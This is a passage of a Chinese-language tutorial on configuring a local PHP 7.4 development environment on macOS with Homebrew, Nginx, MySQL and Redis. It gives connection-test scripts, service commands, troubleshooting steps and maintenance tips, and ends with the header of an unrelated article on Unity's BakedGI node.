    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(
        <span class="hljs-string">"mysql:host=localhost;dbname=dev_database"</span>,
        <span class="hljs-string">"dev_user"</span>,
        <span class="hljs-string">"你的密码"</span>
    );
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"✅ MySQL连接成功&lt;br&gt;"</span>;
    
    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT VERSION() as version"</span>);
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"MySQL版本: "</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">'version'</span>] . <span class="hljs-string">"&lt;br&gt;"</span>;
} <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"❌ MySQL连接失败: "</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">"&lt;br&gt;"</span>;
}
</code></pre>
<h4 data-id="heading-48">8.2.3 Redis连接测试</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// ~/Sites/localhost/redis_test.php</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;Redis连接测试&lt;/h1&gt;"</span>;

<span class="hljs-keyword">try</span> {
    <span class="hljs-variable">$redis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Redis</span>();
    <span class="hljs-variable">$redis</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">6379</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"✅ Redis连接成功&lt;br&gt;"</span>;
    
    <span class="hljs-variable">$redis</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">'test_key'</span>, <span class="hljs-string">'Hello Redis!'</span>);
    <span class="hljs-variable">$value</span> = <span class="hljs-variable">$redis</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'test_key'</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Redis读写测试: <span class="hljs-subst">$value</span>&lt;br&gt;"</span>;
    
    <span class="hljs-comment">// 测试igbinary序列化</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">'igbinary'</span>)) {
        <span class="hljs-variable">$data</span> = [<span class="hljs-string">'test'</span> =&gt; <span class="hljs-string">'data'</span>];
        <span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">igbinary_serialize</span>(<span class="hljs-variable">$data</span>);
        <span class="hljs-variable">$redis</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">'igbinary_test'</span>, <span class="hljs-variable">$serialized</span>);
        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">igbinary_unserialize</span>(<span class="hljs-variable">$redis</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'igbinary_test'</span>));
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"igbinary序列化: "</span> . (<span class="hljs-variable">$data</span> === <span class="hljs-variable">$result</span> ? <span class="hljs-string">"✅ 成功"</span> : <span class="hljs-string">"❌ 失败"</span>) . <span class="hljs-string">"&lt;br&gt;"</span>;
    }
} <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"❌ Redis连接失败: "</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">"&lt;br&gt;"</span>;
}
</code></pre>
<h4 data-id="heading-49">8.2.4 完整环境验证</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// ~/Sites/localhost/final_verification.php</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;🎉 PHP 7.4开发环境完整验证&lt;/h1&gt;"</span>;

<span class="hljs-comment">// PHP版本</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2&gt;PHP版本: "</span> . <span class="hljs-title function_ invoke__">phpversion</span>() . <span class="hljs-string">"&lt;/h2&gt;"</span>;

<span class="hljs-comment">// 扩展检查</span>
<span class="hljs-variable">$extensions</span> = [
    <span class="hljs-string">'pdo_mysql'</span>, <span class="hljs-string">'mysqli'</span>, <span class="hljs-string">'redis'</span>, <span class="hljs-string">'curl'</span>,
    <span class="hljs-string">'gd'</span>, <span class="hljs-string">'mbstring'</span>, <span class="hljs-string">'openssl'</span>, <span class="hljs-string">'igbinary'</span>, <span class="hljs-string">'lzf'</span>
];
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;扩展状态：&lt;/h3&gt;"</span>;
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$extensions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$ext</span>) {
    <span class="hljs-variable">$status</span> = <span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-variable">$ext</span>) ? <span class="hljs-string">"✅"</span> : <span class="hljs-string">"❌"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"<span class="hljs-subst">$status</span> <span class="hljs-subst">$ext</span>&lt;br&gt;"</span>;
}

<span class="hljs-comment">// 服务端口检查</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;服务状态：&lt;/h3&gt;"</span>;
<span class="hljs-variable">$ports</span> = [<span class="hljs-number">80</span> =&gt; <span class="hljs-string">'Nginx'</span>, <span class="hljs-number">9000</span> =&gt; <span class="hljs-string">'PHP-FPM'</span>, <span class="hljs-number">3306</span> =&gt; <span class="hljs-string">'MySQL'</span>, <span class="hljs-number">6379</span> =&gt; <span class="hljs-string">'Redis'</span>];
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ports</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$port</span> =&gt; <span class="hljs-variable">$service</span>) {
    <span class="hljs-variable">$fp</span> = @<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">1</span>);
    <span class="hljs-variable">$status</span> = <span class="hljs-variable">$fp</span> ? <span class="hljs-string">"✅"</span> : <span class="hljs-string">"❌"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"<span class="hljs-subst">$status</span> <span class="hljs-subst">$service</span> (端口 <span class="hljs-subst">$port</span>)&lt;br&gt;"</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
}

<span class="hljs-comment">// 数据库连接</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;数据库连接：&lt;/h3&gt;"</span>;
<span class="hljs-keyword">try</span> {
    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(
        <span class="hljs-string">"mysql:host=localhost;dbname=dev_database"</span>,
        <span class="hljs-string">"dev_user"</span>,
        <span class="hljs-string">"你的密码"</span>
    );
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"✅ MySQL连接成功&lt;br&gt;"</span>;
} <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"❌ MySQL连接失败&lt;br&gt;"</span>;
}

<span class="hljs-comment">// Redis连接</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;Redis连接：&lt;/h3&gt;"</span>;
<span class="hljs-keyword">try</span> {
    <span class="hljs-variable">$redis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Redis</span>();
    <span class="hljs-variable">$redis</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">6379</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"✅ Redis连接成功&lt;br&gt;"</span>;
} <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"❌ Redis连接失败&lt;br&gt;"</span>;
}
</code></pre>
<h3 data-id="heading-50">8.3 浏览器访问测试</h3>
<p>配置完成后，在浏览器中访问：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 主环境验证</span>
http://local.test/final_verification.php

<span class="hljs-comment"># PHP信息</span>
http://local.test/phpinfo.php

<span class="hljs-comment"># 数据库测试</span>
http://local.test/db_test.php

<span class="hljs-comment"># Redis测试</span>
http://local.test/redis_test.php

<span class="hljs-comment"># 多项目</span>
http://blog.test
http://shop.test
http://admin.test
</code></pre>
<hr/>
<h2 data-id="heading-51">常用命令速查</h2>
<h3 data-id="heading-52">服务管理</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动服务</span>
brew services start nginx
brew services start php@7.4
brew services start mysql@8.4
brew services start redis

<span class="hljs-comment"># 停止服务</span>
brew services stop nginx
brew services stop php@7.4
brew services stop mysql@8.4
brew services stop redis

<span class="hljs-comment"># 重启服务</span>
brew services restart nginx
brew services restart php@7.4
brew services restart mysql@8.4
brew services restart redis

<span class="hljs-comment"># 查看所有服务状态</span>
brew services list

<span class="hljs-comment"># 检查特定端口</span>
lsof -i :80      <span class="hljs-comment"># Nginx</span>
lsof -i :9000    <span class="hljs-comment"># PHP-FPM</span>
lsof -i :3306    <span class="hljs-comment"># MySQL</span>
lsof -i :6379    <span class="hljs-comment"># Redis</span>
</code></pre>
<h3 data-id="heading-53">PHP相关</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># PHP版本</span>
php --version

<span class="hljs-comment"># 已加载的扩展</span>
php -m

<span class="hljs-comment"># PHP配置信息</span>
php -i

<span class="hljs-comment"># 查找php.ini位置</span>
php --ini

<span class="hljs-comment"># 特定扩展版本</span>
php -r <span class="hljs-string">"echo phpversion('redis');"</span>
</code></pre>
<h3 data-id="heading-54">MySQL相关</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 连接MySQL</span>
mysql -u root -p
mysql -u dev_user -p

<span class="hljs-comment"># 查看数据库</span>
SHOW DATABASES;

<span class="hljs-comment"># 选择数据库</span>
USE dev_database;

<span class="hljs-comment"># 查看表</span>
SHOW TABLES;

<span class="hljs-comment"># MySQL版本</span>
mysql -V

<span class="hljs-comment"># 重启MySQL</span>
brew services restart mysql@8.4
</code></pre>
<h3 data-id="heading-55">Redis相关</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试连接</span>
redis-cli ping

<span class="hljs-comment"># Redis命令行</span>
redis-cli

<span class="hljs-comment"># 基本操作</span>
redis-cli SET key value
redis-cli GET key
redis-cli KEYS *
redis-cli DEL key

<span class="hljs-comment"># 查看Redis信息</span>
redis-cli INFO

<span class="hljs-comment"># 清空所有数据</span>
redis-cli FLUSHALL
</code></pre>
<h3 data-id="heading-56">Nginx相关</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试配置语法</span>
nginx -t

<span class="hljs-comment"># 重载配置</span>
nginx -s reload

<span class="hljs-comment"># 停止Nginx</span>
nginx -s stop

<span class="hljs-comment"># 查看Nginx版本</span>
nginx -v

<span class="hljs-comment"># 检查配置</span>
nginx -T
</code></pre>
<h3 data-id="heading-57">日志查看</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 实时查看日志</span>
<span class="hljs-built_in">tail</span> -f ~/Sites/logs/php/php_errors.log
<span class="hljs-built_in">tail</span> -f ~/Sites/logs/nginx/local.test.error.log

<span class="hljs-comment"># 查看错误日志</span>
<span class="hljs-built_in">tail</span> -50 ~/Sites/logs/php/php-fpm.error.log
<span class="hljs-built_in">tail</span> -50 ~/Sites/logs/nginx/local.test.error.log

<span class="hljs-comment"># Nginx访问日志</span>
<span class="hljs-built_in">tail</span> -50 ~/Sites/logs/nginx/local.test.access.log
</code></pre>
<hr/>
<h2 data-id="heading-58">故障排除</h2>
<h3 data-id="heading-59">问题1：Nginx启动失败</h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">nginx: [emerg] <span class="hljs-literal">unknown</span> "user" variable
</code></pre>
<p><strong>解决方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查并修复Nginx配置</span>
nginx -t

<span class="hljs-comment"># 查看详细错误</span>
<span class="hljs-built_in">tail</span> -f /opt/homebrew/var/log/nginx/error.log

<span class="hljs-comment"># 确保使用实际用户名而非变量</span>
<span class="hljs-comment"># 错误示例：root /Users/$USER/Sites/localhost;</span>
<span class="hljs-comment"># 正确示例：root /Users/你的用户名/Sites/localhost;</span>
</code></pre>
<h3 data-id="heading-60">问题2：PHP扩展未加载</h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">PHP Fatal <span class="hljs-keyword">error</span>:  Uncaught <span class="hljs-keyword">Error</span>: <span class="hljs-keyword">Class</span> <span class="hljs-comment">'Redis' not found</span>
</code></pre>
<p><strong>解决方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查扩展是否安装</span>
php -m | grep redis

<span class="hljs-comment"># 检查php.ini配置</span>
php -i | grep extension_dir

<span class="hljs-comment"># 确认扩展文件存在</span>
<span class="hljs-built_in">ls</span> /opt/homebrew/Cellar/php@7.4/*/pecl/*/redis.so

<span class="hljs-comment"># 重启PHP-FPM</span>
brew services restart shivammathur/php/php@7.4
</code></pre>
<h3 data-id="heading-61">问题3：MySQL连接失败</h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-css" lang="css">SQLSTATE<span class="hljs-selector-attr">[HY000]</span> <span class="hljs-selector-attr">[1045]</span> Access denied for user
</code></pre>
<p><strong>解决方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查MySQL服务状态</span>
brew services list | grep mysql

<span class="hljs-comment"># 重启MySQL</span>
brew services restart mysql@8.4

<span class="hljs-comment"># 检查MySQL错误日志</span>
<span class="hljs-built_in">tail</span> -f /opt/homebrew/var/mysql/*.err

<span class="hljs-comment"># 验证用户名密码</span>
mysql -u dev_user -p
</code></pre>
<h3 data-id="heading-62">问题4：.dev域名无法访问</h3>
<p><strong>问题原因</strong>：
Chrome对.dev域名实施了HSTS策略</p>
<p><strong>解决方法</strong>：
使用.test域名替代：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># hosts文件中使用.test后缀</span>
127.0.0.1       local.test
127.0.0.1       blog.test
</code></pre>
<h3 data-id="heading-63">问题5：端口被占用</h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-perl" lang="perl">nginx: [emerg] <span class="hljs-keyword">bind</span>() to <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span> failed (<span class="hljs-number">48</span>: Address already in <span class="hljs-keyword">use</span>)
</code></pre>
<p><strong>解决方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查找占用端口的进程</span>
lsof -i :80

<span class="hljs-comment"># 终止占用进程</span>
<span class="hljs-built_in">kill</span> -9 PID

<span class="hljs-comment"># 或使用其他端口</span>
<span class="hljs-comment"># 修改Nginx配置：listen 8080;</span>
</code></pre>
<h3 data-id="heading-64">问题6：PHP-FPM未运行</h3>
<p><strong>解决方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查PHP-FPM服务</span>
brew services list | grep php

<span class="hljs-comment"># 手动启动</span>
brew services start shivammathur/php/php@7.4

<span class="hljs-comment"># 检查错误日志</span>
<span class="hljs-built_in">tail</span> -f ~/Sites/logs/php/php-fpm.error.log

<span class="hljs-comment"># 测试PHP-FPM配置</span>
/opt/homebrew/opt/php@7.4/sbin/php-fpm -t
</code></pre>
<h3 data-id="heading-65">问题7：Redis连接失败</h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">RedisException: Redis server went away</span>
</code></pre>
<p><strong>解决方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查Redis服务状态</span>
brew services list | grep redis

<span class="hljs-comment"># 启动Redis</span>
brew services start redis

<span class="hljs-comment"># 测试连接</span>
redis-cli ping

<span class="hljs-comment"># 检查Redis日志</span>
<span class="hljs-built_in">tail</span> -f /opt/homebrew/var/log/redis.log
</code></pre>
<hr/>
<h2 data-id="heading-66">最佳实践</h2>
<h3 data-id="heading-67">1. 定期维护</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 每周检查服务状态</span>
brew services list

<span class="hljs-comment"># 定期查看日志</span>
<span class="hljs-built_in">tail</span> -f ~/Sites/logs/php/*.<span class="hljs-built_in">log</span>
<span class="hljs-built_in">tail</span> -f ~/Sites/logs/nginx/*.<span class="hljs-built_in">log</span>

<span class="hljs-comment"># 定期清理过期日志</span>
find ~/Sites/logs -name <span class="hljs-string">"*.log"</span> -mtime +7 -delete
</code></pre>
<h3 data-id="heading-68">2. 性能优化</h3>
<h4 data-id="heading-69">PHP优化</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># php.ini</span>
<span class="hljs-attr">opcache.enable</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">opcache.memory_consumption</span> = <span class="hljs-number">256</span>
<span class="hljs-attr">opcache.interned_strings_buffer</span> = <span class="hljs-number">16</span>
<span class="hljs-attr">opcache.max_accelerated_files</span> = <span class="hljs-number">10000</span>
<span class="hljs-attr">opcache.validate_timestamps</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">opcache.revalidate_freq</span> = <span class="hljs-number">2</span>
</code></pre>
<h4 data-id="heading-70">MySQL优化</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf</span>
<span class="hljs-attr">innodb_buffer_pool_size</span> = <span class="hljs-number">512</span>M
<span class="hljs-attr">innodb_log_file_size</span> = <span class="hljs-number">128</span>M
<span class="hljs-attr">max_connections</span> = <span class="hljs-number">200</span>
<span class="hljs-attr">query_cache_size</span> = <span class="hljs-number">64</span>M
</code></pre>
<h4 data-id="heading-71">Redis优化</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># redis.conf</span>
maxmemory 512mb
maxmemory-policy allkeys-lru
appendonly yes
appendfsync everysec
</code></pre>
<h3 data-id="heading-72">3. 安全管理</h3>
<h4 data-id="heading-73">MySQL安全</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用强密码</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'user'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'StrongP@ssw0rd!'</span>;

<span class="hljs-comment">-- 定期备份数据库</span>
mysqldump <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p dev_database <span class="hljs-operator">&gt;</span> backup_$(<span class="hljs-type">date</span> <span class="hljs-operator">+</span><span class="hljs-operator">%</span>Y<span class="hljs-operator">%</span>m<span class="hljs-operator">%</span>d).<span class="hljs-keyword">sql</span>
</code></pre>
<h4 data-id="heading-74">文件权限</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 项目目录权限</span>
<span class="hljs-built_in">chmod</span> 755 ~/Sites/localhost
<span class="hljs-built_in">chmod</span> 644 ~/Sites/localhost/*.php

<span class="hljs-comment"># 日志目录权限</span>
<span class="hljs-built_in">chmod</span> 755 ~/Sites/logs
<span class="hljs-built_in">chmod</span> 644 ~/Sites/logs/**/*.<span class="hljs-built_in">log</span>

<span class="hljs-comment"># 禁止Web访问敏感文件</span>
<span class="hljs-comment"># 在nginx配置中添加：</span>
location ~ /\. {
    deny all;
}
</code></pre>
<h3 data-id="heading-75">4. 开发工作流</h3>
<h4 data-id="heading-76">本地开发</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 启动所有服务</span>
brew services start nginx php@7.4 mysql@8.4 redis

<span class="hljs-comment"># 2. 验证服务状态</span>
brew services list

<span class="hljs-comment"># 3. 测试开发环境</span>
curl http://local.test/final_verification.php

<span class="hljs-comment"># 4. 开始开发...</span>
</code></pre>
<h4 data-id="heading-77">部署前测试</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 检查配置语法</span>
nginx -t
/opt/homebrew/opt/php@7.4/sbin/php-fpm -t

<span class="hljs-comment"># 2. 重启所有服务</span>
brew services restart nginx php@7.4 mysql@8.4 redis

<span class="hljs-comment"># 3. 全面测试</span>
curl -I http://local.test
curl http://local.test/db_test.php
curl http://local.test/redis_test.php
</code></pre>
<h3 data-id="heading-78">5. 备份和恢复</h3>
<h4 data-id="heading-79">数据库备份</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 完整备份</span>
mysqldump -u root -p --all-databases &gt; full_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d).sql

<span class="hljs-comment"># 单个数据库备份</span>
mysqldump -u root -p dev_database &gt; dev_database_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d).sql

<span class="hljs-comment"># 恢复数据库</span>
mysql -u root -p &lt; backup_file.sql
</code></pre>
<h4 data-id="heading-80">配置备份</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 备份所有配置</span>
<span class="hljs-built_in">cp</span> -r /opt/homebrew/etc/nginx ~/backup/nginx_config_$(<span class="hljs-built_in">date</span> +%Y%m%d)
<span class="hljs-built_in">cp</span> -r /opt/homebrew/etc/php/7.4 ~/backup/php_config_$(<span class="hljs-built_in">date</span> +%Y%m%d)
<span class="hljs-built_in">cp</span> -r /opt/homebrew/etc/mysql ~/backup/mysql_config_$(<span class="hljs-built_in">date</span> +%Y%m%d)
</code></pre>
<hr/>
<h2 data-id="heading-81">附录</h2>
<h3 data-id="heading-82">A. Homebrew常用命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装包</span>
brew install &lt;package_name&gt;

<span class="hljs-comment"># 卸载包</span>
brew uninstall &lt;package_name&gt;

<span class="hljs-comment"># 搜索包</span>
brew search &lt;package_name&gt;

<span class="hljs-comment"># 查看已安装的包</span>
brew list

<span class="hljs-comment"># 更新包</span>
brew upgrade &lt;package_name&gt;

<span class="hljs-comment"># 清理旧版本</span>
brew cleanup

<span class="hljs-comment"># 查看信息</span>
brew info &lt;package_name&gt;
</code></pre>
<h3 data-id="heading-83">B. 常用文件位置</h3>













































<table><thead><tr><th>用途</th><th>路径</th></tr></thead><tbody><tr><td>PHP配置</td><td><code>/opt/homebrew/etc/php/7.4/php.ini</code></td></tr><tr><td>PHP-FPM配置</td><td><code>/opt/homebrew/etc/php/7.4/php-fpm.d/www.conf</code></td></tr><tr><td>Nginx配置</td><td><code>/opt/homebrew/etc/nginx/nginx.conf</code></td></tr><tr><td>Nginx虚拟主机</td><td><code>/opt/homebrew/etc/nginx/servers/</code></td></tr><tr><td>MySQL配置</td><td><code>/opt/homebrew/etc/mysql/my.cnf</code></td></tr><tr><td>Redis配置</td><td><code>/opt/homebrew/etc/redis.conf</code></td></tr><tr><td>PHP错误日志</td><td><code>~/Sites/logs/php/php_errors.log</code></td></tr><tr><td>Nginx访问日志</td><td><code>~/Sites/logs/nginx/*.access.log</code></td></tr><tr><td>项目根目录</td><td><code>~/Sites/</code></td></tr></tbody></table>
<h3 data-id="heading-84">C. 参考资源</h3>
<ul>
<li><strong>Homebrew官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fbrew.sh" target="_blank" title="https://brew.sh" ref="nofollow noopener noreferrer">brew.sh</a></li>
<li><strong>PHP官方文档</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.php.net%2Fmanual%2F" target="_blank" title="https://www.php.net/manual/" ref="nofollow noopener noreferrer">www.php.net/manual/</a></li>
<li><strong>MySQL官方文档</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.mysql.com%2Fdoc%2F" target="_blank" title="https://dev.mysql.com/doc/" ref="nofollow noopener noreferrer">dev.mysql.com/doc/</a></li>
<li><strong>Redis官方文档</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fredis.io%2Fdocumentation" target="_blank" title="https://redis.io/documentation" ref="nofollow noopener noreferrer">redis.io/documentati…</a></li>
<li><strong>Nginx官方文档</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fnginx.org%2Fen%2Fdocs%2F" target="_blank" title="https://nginx.org/en/docs/" ref="nofollow noopener noreferrer">nginx.org/en/docs/</a></li>
</ul>
<hr/>
<h2 data-id="heading-85">总结</h2>
<p>恭喜！你已经成功在macOS上配置了完整的PHP 7.4开发环境，包括：</p>
<p>✅ <strong>PHP 7.4.33</strong> - 完整的PHP开发环境<br/>
✅ <strong>MySQL 8.4.x</strong> - 关系型数据库<br/>
✅ <strong>Redis 8.4.x</strong> - 高性能缓存系统<br/>
✅ <strong>Nginx 1.29.x</strong> - Web服务器<br/>
✅ <strong>igbinary</strong> - 二进制序列化加速<br/>
✅ <strong>LZF</strong> - 轻量级压缩<br/>
✅ <strong>.test域名</strong> - 专业的本地开发域名</p>
<h3 data-id="heading-86">下一步建议</h3>
<ol>
<li><strong>熟悉环境</strong>：访问 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocal.test%2Ffinal_verification.php" target="_blank" title="http://local.test/final_verification.php" ref="nofollow noopener noreferrer">local.test/final_verif…</a> 验证所有功能</li>
<li><strong>创建项目</strong>：在 ~/Sites/projects/ 目录下创建你的项目</li>
<li><strong>添加域名</strong>：使用域名管理工具添加新项目域名</li>
<li><strong>学习优化</strong>：根据项目需求调整配置优化性能</li>
</ol>
<p>祝你开发愉快！🚀</p>
<hr/>
<blockquote>
<p>本教程最后更新时间：2026年2月<br/>
适用系统：macOS (Apple Silicon / Intel)<br/>
适用Homebrew版本：4.0+</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【节点】[BakedGI节点]原理解析与实际应用]]></title>    <link>https://juejin.cn/post/7605807405307134015</link>    <guid>https://juejin.cn/post/7605807405307134015</guid>    <pubDate>2026-02-13T02:01:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605807405307134015" data-draft-id="7605792874173186111" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【节点】[BakedGI节点]原理解析与实际应用"/> <meta itemprop="keywords" content="游戏开发,图形学,Unity3D"/> <meta itemprop="datePublished" content="2026-02-13T02:01:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【节点】[BakedGI节点]原理解析与实际应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:01:04.000Z" title="Fri Feb 13 2026 02:01:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
